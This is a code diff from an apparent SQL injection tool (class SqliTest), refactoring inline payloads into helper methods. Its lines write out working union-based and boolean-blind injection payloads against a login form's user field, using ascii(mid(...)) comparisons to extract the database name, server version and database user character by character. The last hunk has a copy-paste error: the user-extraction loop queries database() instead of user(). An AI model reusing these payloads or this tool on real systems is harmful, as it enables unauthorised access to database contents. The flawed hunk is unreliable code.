@@ -39,6 +39,7 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
+
                 # payload = "user=ddog123' union select 1,length(database())%23&passwd=ddog123&submit=Log+In"
                 payload = self.dealpayload.construct_normal_payload(select='length(database())')
                 r = self.Data.GetData(payload)
@@ -66,8 +67,10 @@ class SqliTest(BaseConfig):
                 logger.debug("Start database length sqli...")
                 # logger.debug("Start database length sqli payload Queue build...")
                 for i in trange(30, desc="Database length sqli...", leave=False):
-                    payload = "user=user1' %26%26 (select length(database())) > " + repr(i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
-                    # print self.len
+                    # payload = "user=user1' %26%26 ((select length(database())) > " + repr(i) + ")  %26%26 '1'='1&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(database())",
+                        compare=i)
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         database_len = i
                         break
@@ -80,7 +83,10 @@ class SqliTest(BaseConfig):
                 logger.debug("Start database sqli...")
                 for i in range(1, database_len):
                     for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
-                        payload = "user=user1'%26%26ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
+                        # payload = "user=user1'%26%26ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
+                        payload = self.dealpayload.construct_build_payload(
+                            select="ascii(mid(database()," + repr(i) + ",1))",
+                            compare=(j + 30))
                         if self.Data.GetBuildData(payload, self.len) == 0:
                             database += chr(int(j+30))
                             break
@@ -143,8 +149,10 @@ class SqliTest(BaseConfig):
                 logger.debug("Start database length sqli...")
                 # logger.debug("Start database length sqli payload Queue build...")
                 for i in trange(30, desc="Database length sqli...", leave=False):
-                    payload = {"user": "user1' && (select length(database())) > " + repr(i) + " && '1'='1", "passwd": "ddog123"}
-                    # payload = "username=ddog123' && (select length(database())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
+                    # payload = {"user": "user1' && (select length(database())) > " + repr(i) + " && '1'='1", "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(database())",
+                        compare=i)
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         database_len = i
                         break
@@ -157,8 +165,10 @@ class SqliTest(BaseConfig):
                 logger.debug("Start database sqli...")
                 for i in range(1, database_len + 1):
                     for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
-                        payload = {"user": "user1' && ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1", "passwd": "ddog123"}
-                        # payload = "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
+                        # payload = {"user": "user1' && ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1", "passwd": "ddog123"}
+                        payload = self.dealpayload.construct_build_payload(
+                            select="ascii(mid(database()," + repr(i) + ",1))",
+                            compare=(j + 30))
                         if self.Data.PostBuildData(payload, self.len) == 0:
                             database += chr(int(j + 30))
                             break
@@ -226,8 +236,11 @@ class SqliTest(BaseConfig):
                 logger.debug("Start version length sqli...")
                 # logger.debug("Start version length sqli payload Queue build...")
                 for i in trange(30, desc="Version length sqli...", leave=False):
-                    payload = "user=user1' %26%26 (select length(version())) > " + repr(
-                        i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
+                    # payload = "user=user1' %26%26 (select length(version())) > " + repr(
+                    #     i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(version())",
+                        compare=i)
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         version_len = i
                         break
@@ -240,8 +253,11 @@ class SqliTest(BaseConfig):
                 logger.debug("Start version sqli...")
                 for i in range(1, version_len + 1):
                     for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
-                        payload = "user=user1'%26%26ascii(mid(version()," + repr(i) + ",1))>" + repr(
-                            j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
+                        # payload = "user=user1'%26%26ascii(mid(version()," + repr(i) + ",1))>" + repr(
+                        #     j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
+                        payload = self.dealpayload.construct_build_payload(
+                            select="ascii(mid(version()," + repr(i) + ",1))",
+                            compare=(j + 30))
                         if self.Data.GetBuildData(payload, self.len) == 0:
                             version += chr(int(j + 30))
                             break
@@ -283,8 +299,8 @@ class SqliTest(BaseConfig):
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start version length sqli...")
-                payload = {"user": "ddog' union select 1,length(version())#", "password": "a"}
-                # payload = "username=ddog123' && select length(version()) && '1'='1&passwd=ddog123&submit=Log+In"
+                # payload = {"user": "ddog' union select 1,length(version())#", "password": "a"}
+                payload = self.dealpayload.construct_normal_payload(select='length(version())')
                 r = self.Data.PostData(payload)
                 version_len = int(UnpackFunction(r))
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
@@ -292,8 +308,8 @@ class SqliTest(BaseConfig):
 
                 # 然后注version
                 logger.debug("Start version sqli...")
-                payload = {"user": "ddog' union select 1,version()#", "password": "a"}
-                # payload = "username=ddog123' && select version() && '1'='1&passwd=ddog123&submit=Log+In"
+                # payload = {"user": "ddog' union select 1,version()#", "password": "a"}
+                payload = self.dealpayload.construct_normal_payload(select='version()')
                 r = self.Data.PostData(payload)
                 version = UnpackFunction(r)
                 logger.debug("Version sqli success...The version is %s" % version)
@@ -305,9 +321,11 @@ class SqliTest(BaseConfig):
                 logger.debug("Start version length sqli...")
                 # logger.debug("Start version length sqli payload Queue build...")
                 for i in trange(30, desc="Version length sqli...", leave=False):
-                    payload = {"user": "user1' && (select length(version())) > " + repr(i) + " && '1'='1",
-                               "passwd": "ddog123"}
-                    # payload = "username=ddog123' && (select length(version())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
+                    # payload = {"user": "user1' && (select length(version())) > " + repr(i) + " && '1'='1",
+                    #            "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(version())",
+                        compare=i)
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         version_len = i
                         break
@@ -320,10 +338,12 @@ class SqliTest(BaseConfig):
                 logger.debug("Start version sqli...")
                 for i in range(1, version_len + 1):
                     for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
-                        payload = {
-                            "user": "user1' && ascii(mid(version()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
-                            "passwd": "ddog123"}
-                        # payload = "ddog123'&&ascii(mid(version()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
+                        # payload = {
+                        #     "user": "user1' && ascii(mid(version()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
+                        #     "passwd": "ddog123"}
+                        payload = self.dealpayload.construct_build_payload(
+                            select="ascii(mid(version()," + repr(i) + ",1))",
+                            compare=(j + 30))
                         if self.Data.PostBuildData(payload, self.len) == 0:
                             version += chr(int(j + 30))
                             break
@@ -393,8 +413,11 @@ class SqliTest(BaseConfig):
                 logger.debug("Start user length sqli...")
                 # logger.debug("Start user length sqli payload Queue build...")
                 for i in trange(30, desc="User length sqli...", leave=False):
-                    payload = "user=user1' %26%26 (select length(user())) > " + repr(
-                        i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
+                    # payload = "user=user1' %26%26 (select length(user())) > " + repr(
+                    #     i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(user())",
+                        compare=i)
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         user_len = i
                         break
@@ -407,8 +430,11 @@ class SqliTest(BaseConfig):
                 logger.debug("Start user sqli...")
                 for i in range(1, user_len + 1):
                     for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
-                        payload = "user=user1'%26%26ascii(mid(user()," + repr(i) + ",1))>" + repr(
-                            j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
+                        # payload = "user=user1'%26%26ascii(mid(user()," + repr(i) + ",1))>" + repr(
+                        #     j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
+                        payload = self.dealpayload.construct_build_payload(
+                            select="ascii(mid(user()," + repr(i) + ",1))",
+                            compare=(j + 30))
                         if self.Data.GetBuildData(payload, self.len) == 0:
                             user += chr(int(j + 30))
                             break
@@ -472,9 +498,11 @@ class SqliTest(BaseConfig):
                 logger.debug("Start user length sqli...")
                 # logger.debug("Start user length sqli payload Queue build...")
                 for i in trange(30, desc="User length sqli...", leave=False):
-                    payload = {"user": "user1' && (select length(user())) > " + repr(i) + " && '1'='1",
-                               "passwd": "ddog123"}
-                    # payload = "username=ddog123' && (select length(user())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
+                    # payload = {"user": "user1' && (select length(user())) > " + repr(i) + " && '1'='1",
+                    #            "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(user())",
+                        compare=i)
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         user_len = i
                         break
@@ -487,10 +515,12 @@ class SqliTest(BaseConfig):
                 logger.debug("Start user sqli...")
                 for i in range(1, user_len + 1):
                     for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
-                        payload = {
-                            "user": "user1' && ascii(mid(user()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
-                            "passwd": "ddog123"}
-                        # payload = "ddog123'&&ascii(mid(user()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
+                        # payload = {
+                        #     "user": "user1' && ascii(mid(user()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
+                        #     "passwd": "ddog123"}
+                        payload = self.dealpayload.construct_build_payload(
+                            select="ascii(mid(database()," + repr(i) + ",1))",
+                            compare=(j + 30))
                         if self.Data.PostBuildData(payload, self.len) == 0:
                             user += chr(int(j + 30))
                             break
